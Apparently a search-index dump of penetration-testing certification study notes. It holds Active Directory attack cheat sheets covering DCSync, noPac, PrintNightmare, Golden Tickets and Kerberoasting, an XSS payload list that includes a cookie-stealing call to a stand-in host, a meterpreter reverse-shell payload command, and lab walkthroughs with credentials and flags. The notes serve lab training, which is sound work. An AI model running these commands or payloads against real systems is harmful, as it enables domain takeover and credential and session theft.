1</code>) from a Windows-based host. <code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code> PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host. <code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" \\| Select MemberName</code> PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host. <code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code> PowerView tool used create a fake\u00a0<code>Service Principal Name</code>\u00a0given a sepecift user (<code>adunn</code>) from a Windows-based host. <code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code> PowerView tool used to remove the fake\u00a0<code>Service Principal Name</code>\u00a0created during the attack from a Windows-based host. <code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose</code> PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host. <code>ConvertFrom-SddlString</code> PowerShell cmd-let used to covert an\u00a0<code>SDDL string</code>\u00a0into a readable format. Performed from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#dcsync","title":"DCSync","text":"Command Description <code>Get-DomainUser -Identity adunn \\| select samaccountname,objectsid,memberof,useraccountcontrol \\|fl</code> PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host. <code>$sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\" Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs \\| ? { ($_.ObjectAceType -match 'Replication-Get')} \\| ?{$_.SecurityIdentifier -match $sid} \\| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \\| fl</code> Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool\u00a0<code>Get-ObjectAcl</code>\u00a0to check a specific user's replication rights. Performed from a Windows-based host. <code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5\u00a0-use-vss</code> Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>inlanefreight_hashes</code>). Performed from a Linux-based host. <code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator</code> Uses\u00a0<code>Mimikatz</code>\u00a0to perform a\u00a0<code>dcsync</code>\u00a0attack from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#privileged-access","title":"Privileged Access","text":"Command Description <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"</code> PowerView based tool to used to enumerate the\u00a0<code>Remote Desktop Users</code>\u00a0group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host. <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"</code> PowerView based tool to used to enumerate the\u00a0<code>Remote Management Users</code>\u00a0group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host. <code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force</code> Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host. <code>$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)</code> Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host. <code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code> Uses the PowerShell cmd-let\u00a0<code>Enter-PSSession</code>\u00a0to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code>\u00a0&amp;\u00a0<code>$password</code>). <code>evil-winrm -i 10.129.201.234 -u forend</code> Used to establish a PowerShell session with a Windows target from a Linux-based host using\u00a0<code>WinRM</code>. <code>Import-Module .\\PowerUpSQL.ps1</code> Used to import the\u00a0<code>PowerUpSQL</code>\u00a0tool. <code>Get-SQLInstanceDomain</code> PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. <code>Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'</code> PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query 'Select @@version'</code>) from a Windows-based host. <code>mssqlclient.py</code> Impacket tool used to display the functionality and options provided with\u00a0<code>mssqlclient.py</code>\u00a0from a Linux-based host. <code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150\u00a0-windows-auth</code> Impacket tool used to connect to a MSSQL server from a Linux-based host. <code>SQL&gt; help</code> Used to display mssqlclient.py options once connected to a MSSQL server. <code>SQL&gt; enable_xp_cmdshell</code> Used to enable\u00a0<code>xp_cmdshell stored procedure</code>\u00a0that allows for executing OS commands via the database from a Linux-based host. <code>xp_cmdshell whoami /priv</code> Used to enumerate rights on a system using\u00a0<code>xp_cmdshell</code>.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#nopac","title":"NoPac","text":"Command Description <code>sudo git clone https://github.com/Ridter/noPac.git</code> Used to clone a\u00a0<code>noPac</code>\u00a0exploit using git. Performed from a Linux-based host. <code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code> Runs\u00a0<code>scanner.py</code>\u00a0to check if a target system is vulnerable to\u00a0<code>noPac</code>/<code>Sam_The_Admin</code>\u00a0from a Linux-based host. <code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code> Used to exploit the\u00a0<code>noPac</code>/<code>Sam_The_Admin</code>\u00a0vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host. <code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code> Used to exploit the\u00a0<code>noPac</code>/<code>Sam_The_Admin</code>\u00a0vulnerability and perform a\u00a0<code>DCSync</code>\u00a0attack against the built-in Administrator account on a Domain Controller from a Linux-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#printnightmare","title":"PrintNightmare","text":"Command Description <code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code> Used to clone a PrintNightmare exploit using git from a Linux-based host. <code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code> Used to ensure the exploit author's (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. <code>rpcdump.py @172.16.5.5 \\| egrep 'MS-RPRN\\|MS-PAR'</code> Used to check if a Windows target has\u00a0<code>MS-PAR</code>\u00a0&amp;\u00a0<code>MSRPRN</code>\u00a0exposed from a Linux-based host. <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code> Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. <code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code> Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. <code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 '\\\\10.129.202.111\\CompData\\backupscript.dll'</code> Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#petitpotam","title":"PetitPotam","text":"Command Description <code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code> Impacket tool used to create an\u00a0<code>NTLM relay</code>\u00a0by specifiying the web enrollment URL for the\u00a0<code>Certificate Authority</code>\u00a0host. Perfomred from a Linux-based host. <code>git clone https://github.com/topotam/PetitPotam.git</code> Used to clone the\u00a0<code>PetitPotam</code>\u00a0exploit using git. Performed from a Linux-based host. <code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code> Used to execute the PetitPotam exploit by specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host. <code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code> Uses\u00a0<code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host. <code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code> Impacket tool used to perform a DCSync attack and retrieve one or all of the\u00a0<code>NTLM password hashes</code>\u00a0from the target Windows domain. Performed from a Linux-based host. <code>klist</code> <code>krb5-user</code>\u00a0command used to view the contents of the\u00a0<code>ccache</code>\u00a0file. Performed from a Linux-based host. <code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code> Used to submit TGS requests using\u00a0<code>getnthash.py</code>\u00a0from a Linux-based host. <code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code> Impacket tool used to extract hashes from\u00a0<code>NTDS.dit</code>\u00a0using a\u00a0<code>DCSync attack</code>\u00a0and a captured hash (<code>-hashes</code>). Performed from a Linux-based host. <code>.\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code> Uses Rubeus to request a TGT and perform a\u00a0<code>pass-the-ticket attack</code>\u00a0using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:inlanefreight\\krbtgt</code> Performs a DCSync attack using\u00a0<code>Mimikatz</code>. Performed from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#miscellaneous-misconfigurations","title":"Miscellaneous Misconfigurations","text":"Command Description <code>Import-Module .\\SecurityAssessment.ps1</code> Used to import the module\u00a0<code>Security Assessment.ps1</code>. Performed from a Windows-based host. <code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code> SecurityAssessment.ps1 based tool used to enumerate a Windows target for\u00a0<code>MS-PRN Printer bug</code>. Performed from a Windows-based host. <code>adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5</code> Used to resolve all records in a DNS zone over\u00a0<code>LDAP</code>\u00a0from a Linux-based host. <code>adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r</code> Used to resolve unknown records in a DNS zone by performing an\u00a0<code>A query</code>\u00a0(<code>-r</code>) from a Linux-based host. <code>Get-DomainUser * \\| Select-Object samaccountname,description</code> PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host. <code>Get-DomainUser -UACFilter PASSWD_NOTREQD \\| Select-Object samaccountname,useraccountcontrol</code> PowerView tool used to check for the\u00a0<code>PASSWD_NOTREQD</code>\u00a0setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host. <code>ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts</code> Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#group-policy-enumeration-attacks","title":"Group Policy Enumeration &amp; Attacks","text":"Command Description <code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code> Tool used to decrypt a captured\u00a0<code>group policy preference password</code>\u00a0from a Linux-based host. <code>crackmapexec smb -L \\| grep gpp</code> Locates and retrieves a\u00a0<code>group policy preference password</code>\u00a0using\u00a0<code>CrackMapExec</code>, the filters the output using\u00a0<code>grep</code>. Peformed from a Linux-based host. <code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code> Locates and retrieves any credentials stored in the\u00a0<code>SYSVOL</code>\u00a0share of a Windows target using\u00a0<code>CrackMapExec</code>\u00a0from a Linux-based host. <code>Get-DomainGPO \\| select displayname</code> PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. <code>Get-GPO -All \\| Select DisplayName</code> PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host. <code>$sid=Convert-NameToSid \"Domain Users\"</code> Creates a variable called\u00a0<code>$sid</code>\u00a0that is set equal to the\u00a0<code>Convert-NameToSid</code>\u00a0tool and specifies the group account\u00a0<code>Domain Users</code>. Performed from a Windows-based host. <code>Get-DomainGPO \\| Get-ObjectAcl \\| ?{$_.SecurityIdentifier -eq $sid</code> PowerView tool that is used to check if the\u00a0<code>Domain Users</code>\u00a0(<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host. <code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code> PowerShell cmd-let used to display the name of a GPO given a\u00a0<code>GUID</code>. Performed from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#asreproasting","title":"ASREPRoasting","text":"Command Description <code>Get-DomainUser -PreauthNotRequired \\| select samaccountname,userprincipalname,useraccountcontrol \\| fl</code> PowerView based tool used to search for the\u00a0<code>DONT_REQ_PREAUTH</code>\u00a0value across in user accounts in a target Windows domain. Performed from a Windows-based host. <code>.\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code> Uses\u00a0<code>Rubeus</code>\u00a0to perform an\u00a0<code>ASEP Roasting attack</code>\u00a0and formats the output for\u00a0<code>Hashcat</code>. Performed from a Windows-based host. <code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</code> Uses\u00a0<code>Hashcat</code>\u00a0to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host. <code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code> Enumerates users in a target Windows domain and automatically retrieves the\u00a0<code>AS</code>\u00a0for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#trust-relationships-child-parent-trusts","title":"Trust Relationships - Child &gt; Parent Trusts","text":"Command Description <code>Import-Module activedirectory</code> Used to import the\u00a0<code>Active Directory</code>\u00a0module. Performed from a Windows-based host. <code>Get-ADTrust -Filter *</code> PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. <code>Get-DomainTrust</code> PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. <code>Get-DomainTrustMapping</code> PowerView tool used to perform a domain trust mapping from a Windows-based host. <code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \\| select SamAccountName</code> PowerView tools used to enumerate users in a target child domain from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt</code> Uses Mimikatz to obtain the\u00a0<code>KRBTGT</code>\u00a0account's\u00a0<code>NT Hash</code>\u00a0from a Windows-based host. <code>Get-DomainSID</code> PowerView tool used to get the SID for a target child domain from a Windows-based host. <code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" \\| select distinguishedname,objectsid</code> PowerView tool used to obtain the\u00a0<code>Enterprise Admins</code>\u00a0group's SID from a Windows-based host. <code>ls \\\\academy-ea-dc01.inlanefreight.local\\c$</code> Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. <code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code> Uses\u00a0<code>Mimikatz</code>\u00a0to create a\u00a0<code>Golden Ticket</code>\u00a0from a Windows-based host . <code>.\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code> Uses\u00a0<code>Rubeus</code>\u00a0to create a\u00a0<code>Golden Ticket</code>\u00a0from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm</code> Uses\u00a0<code>Mimikatz</code>\u00a0to perform a DCSync attack from a Windows-based host. <code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240\u00a0-just-dc-user LOGISTICS/krbtgt</code> Impacket tool used to perform a DCSync attack from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code> Impacket tool used to perform a\u00a0<code>SID Brute forcing</code>\u00a0attack from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240\u00a0\\| grep \"Domain SID\"</code> Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5\u00a0\\| grep -B12 \"Enterprise Admins\"</code> Impacket tool used to retrieve the\u00a0<code>SID</code>\u00a0of a target Windows domain and attach it to the Enterprise Admin group's\u00a0<code>RID</code>\u00a0from a Linux-based host. <code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code> Impacket tool used to create a\u00a0<code>Golden Ticket</code>\u00a0from a Linux-based host. <code>export KRB5CCNAME=hacker.ccache</code> Used to set the\u00a0<code>KRB5CCNAME Environment Variable</code>\u00a0from a Linux-based host. <code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local\u00a0-k -no-pass -target-ip 172.16.5.5</code> Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. <code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code> Impacket tool that automatically performs an attack that escalates from child to parent domain.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#trust-relationships-cross-forest","title":"Trust Relationships - Cross-Forest","text":"Command Description <code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \\| select SamAccountName</code> PowerView tool used to enumerate accounts for associated\u00a0<code>SPNs</code>\u00a0from a Windows-based host. <code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \\| select samaccountname,memberof</code> PowerView tool used to enumerate the\u00a0<code>mssqlsvc</code>\u00a0account from a Windows-based host. <code>.\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code> Uses\u00a0<code>Rubeus</code>\u00a0to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host. <code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code> PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. <code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator</code> PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host. <code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code> Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host. <code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code> Runs the Python implementation of\u00a0<code>BloodHound</code>\u00a0against a target Windows domain from a Linux-based host. <code>zip -r ilfreight_bh.zip *.json</code> Used to compress multiple files into 1 single\u00a0<code>.zip</code>\u00a0file to be uploaded into the BloodHound GUI.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#xss","title":"XSS","text":"Code Description XSS Payloads <code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> Basic XSS Payload <code>&lt;plaintext&gt;</code> Basic XSS Payload <code>&lt;script&gt;print()&lt;/script&gt;</code> Basic XSS Payload <code>&lt;img src=\"\" onerror=alert(window.origin)&gt;</code> HTML-based XSS Payload <code>&lt;script&gt;document.body.style.background = \"#141d2b\"&lt;/script&gt;</code> Change Background Color <code>&lt;script&gt;document.body.background = \"https://www.hackthebox.eu/images/logo-htb.svg\"&lt;/script&gt;</code> Change Background Image <code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</code> Change Website Title <code>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</code> Overwrite website's main body <code>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</code> Remove certain HTML element <code>&lt;script src=\"http://OUR_IP/script.js\"&gt;&lt;/script&gt;</code> Load remote script <code>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</code> Send Cookie details to us Commands <code>python xsstrike.py -u \"http://SERVER_IP:PORT/index.php?task=test\"</code> Run\u00a0<code>xsstrike</code>\u00a0on a url parameter <code>sudo nc -lvnp 80</code> Start\u00a0<code>netcat</code>\u00a0listener <code>sudo php -S 0.0.0.0:80</code> Start\u00a0<code>PHP</code>\u00a0server","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-index/","title":"CPTS","text":"Number Module My notes Duration 01 Penetration Testing Process Penetration Testing Process 6 hours Introduction 02 Network Enumeration with Nmap (Almost) all about nmap 7 hours Reconnaissance, Enumeration &amp; Attack Planning 03 Footprinting Introduction to footprinting Infrastructure and web enumeration Some services:  FTP, SMB, NFS, DNS, SMTP, IMAP/POP3,SNMP, MySQL, Oracle TNS, IPMI, SSH, RSYNC, R Services, RDP, WinRM, WMI 2 days Reconnaissance, Enumeration &amp; Attack Planning 04 Information Gathering - Web Edition Information Gathering - Web Edition. With tools such as Gobuster, ffuf, Burpsuite, Wfuzz, feroxbuster, OWASP WSTG-INFO-02, OWASP WSTG-INFO-02, Google Dorks More tools for recon: finalrecon 7 hours Reconnaissance, Enumeration &amp; Attack Planning 05 Vulnerability Assessment Vulnerability Assessment:  Nessus, Openvas 2 hours Reconnaissance, Enumeration &amp; Attack Planning 06 File Transfer techniques File Transfer Techniques:  Linux, Windows, Code- netcat python php and others, Bypassing file upload restrictions, File encryption, Evading techniques when transferring files, LOLbas Living off the land binaries 3 hours Reconnaissance, Enumeration &amp; Attack Planning 07 Shells &amp; Payloads Bind shells, Reverse shells, Spawn a shell, Web shells (Laudanum and nishang), Windows footprinting, 2 days Reconnaissance, Enumeration &amp; Attack Planning 08 Using the Metasploit Framework Metasploit, Msfvenom 5 hours Reconnaissance, Enumeration &amp; Attack Planning 09 Password Attacks Password attacks 8 hours Exploitation &amp; Lateral Movement 10 Attacking Common Services Common services: FTP SMB (tools: smbclient, smbmap, rpcclient, Samba Suite, crackmapexec, impacket-smbexec, impacket-psexec), Databases (MySQL and Attacking MySQL, MSSQL and Atacking MSSQL, log4j, RDP, DNS, SMTP, IMAP/POP protocols, postfix, swaks 8 hours Exploitation &amp; Lateral Movement. Machines:- Rabbit - \u00a0SneakyMailer- Reel 11 Pivoting, Tunneling, and Port Forwarding Pivoting, Tunneling, and Port Forwarding 2 days Exploitation &amp; Lateral Movement.Machines:- Enterprise IPPSec Walkthrough- Inception IPPSec Walkthrough- Reddish IPPSec Walkthrough 12 Active Directory Enumeration &amp; Attacks Active DirectoryFrom Linux:- Enumeration,- Attacks,- Lateral Movements, - Privilege Escalation.From Windows:- Enumeration,- Attacks, - Privilege Escalation. Tools: - Powershell, - Active Directory powershell Module,- Enumeration with LDAP queries- PowerView.ps1 from PowerSploit project (powershell).- The ActiveDirectory PowerShell module (powershell).- BloodHound (C# and PowerShell Collectors).- SharpView (C#).- kerbrute.- Crackmapexec.- enum4linux. 7 days Exploitation &amp; Lateral Movement 13 Using Web Proxies Proxies: burpsuite, zap-proxy, proxychains 8 hours Web Exploitation 14 Attacking Web Applications with Ffuf ffuf 5 hours Web Exploitation 15 Login Brute Forcing 6 hours Web Exploitation 16 SQL Injection Fundamentals 8 hours Web Exploitation 17 SQLMap Essentials 8 hours Web Exploitation 18 Cross-Site Scripting (XSS) XSS 6 hours Web Exploitation 19 File Inclusion 8 hours Web Exploitation 20 File Upload Attacks 8 hours Web Exploitation 21 Command Injections 6 hours Web Exploitation 22 Web Attacks Web exploitation 2 days Web Exploitation 23 Attacking Common Applications 4 days Web Exploitation 24 Linux Privilege Escalation 8 hours Post-Exploitation 25 Windows Privilege Escalation 4 days Post-Exploitation 26 Documentation &amp; Reporting 2 days Reporting &amp; Capstone 27 Attacking Enterprise Networks 2 days Reporting &amp; Capstone","tags":["CPTS"]},{"location":"cpts-index/#practicing-steps","title":"Practicing Steps","text":"<p>Starting point:</p> <ul> <li>2x Modules: The modules chosen should be categorized according to\u00a0<code>two different difficulties</code>:\u00a0<code>technical</code>\u00a0and\u00a0<code>offensive</code>.</li> <li>3x Retired Machines: we recommend choosing\u00a0<code>two easy</code>\u00a0and\u00a0<code>one medium</code>\u00a0machines. At the end of each module, you will find recommended retired machines to consider that will help you practice the specific tools and topics covered in the module. These hosts will share one or more attack vectors tied to the module.</li> <li>5x Active Machines: After building a good foundation with the modules and the retired machines, we can venture to\u00a0<code>two easy</code>,\u00a0<code>two medium</code>, and\u00a0<code>one hard</code>\u00a0active machine. We can also take these from the corresponding module recommendations at the end of each module in Academy.</li> <li>1x Pro Lab / Endgame: These labs are large multi-host environments that often simulate enterprise networks of varying sizes similar to those we could run into during actual penetration tests for our clients.</li> </ul>","tags":["CPTS"]},{"location":"cpts-labs/","title":"CPTS labs","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#getting-started","title":"Getting Started","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#pentesting-basics","title":"Pentesting Basics","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#service-scanning","title":"Service scanning","text":"<p>Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?</p> <pre><code>sudo nmap -sC -sV -p8080 $ip \n</code></pre> <p>Results: Apache Tomcat</p> <p>Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.</p> <pre><code>sudo nmap -sC -sV $ip\n</code></pre> <p>Results: 2323</p> <p>List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.</p> <pre><code>smbclient  /\\/\\10.129.125.178/\\users -U bob\n# password: Welcome1. Included in the path explanation\n\nsmb&gt;dir\nsmb&gt;cd flag\nsmb&gt;get flag.txt\nsmb&gt;quit\ncat flag.txt\n</code></pre> <p>Results: dceece590f3284c3866305eb2473d099</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#web-enumeration","title":"Web Enumeration","text":"<p>Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.</p> <pre><code>dirb http://94.237.55.246:55655/    \n# From enumeration you can get to dirb http://94.237.55.246:55655/robots.txt\n</code></pre> <p>Go to http://94.237.55.246:55655/robots.txt and you will notice http://94.237.55.246:55655/admin-login-page.php</p> <p>Visit it and, hardcoded in the site you will see:</p> <pre><code>                &lt;!-- TODO: remove test credentials admin:password123 --&gt;\n</code></pre> <p>Login into the app.</p> <p>Results: HTB{w3b_3num3r4710n_r3v34l5_53cr375}There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#public-exploits","title":"Public Exploits","text":"<p>Access to the web app at http://ip:36883</p> <p>The title of the wordpress post is \"Simple Backup Plugin 2.7.10\", which is a well-known vulnerable plugin. </p> <pre><code>searchsploit Simple Backup Plugin 2.7.10\n</code></pre> <pre><code>----------------------------------------------------------- ---------------------------------\n Exploit Title                                             |  Path\n----------------------------------------------------------- ---------------------------------\nSimple Backup Plugin Python Exploit 2.7.10 - Path Traversa | php/webapps/51937.txt\n----------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <pre><code>sudo cp /usr/share/exploitdb/exploits/php/webapps/51937.txt .\nmv 51937.txt 51937.py\nchmod +x 51937.py\npython ./51937.py http://83.136.255.162:36883/ \"/flag.txt\" 4\n#  target_url = sys.argv[1]\n#  file_name = sys.argv[2]\n#  depth = int(sys.argv[3])\n</code></pre> <p>Results: HTB{my_f1r57_h4ck}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#privilege-escalation","title":"Privilege Escalation","text":"<p>SSH to $ip with user \"user1\" and password \"password1\". SSH into 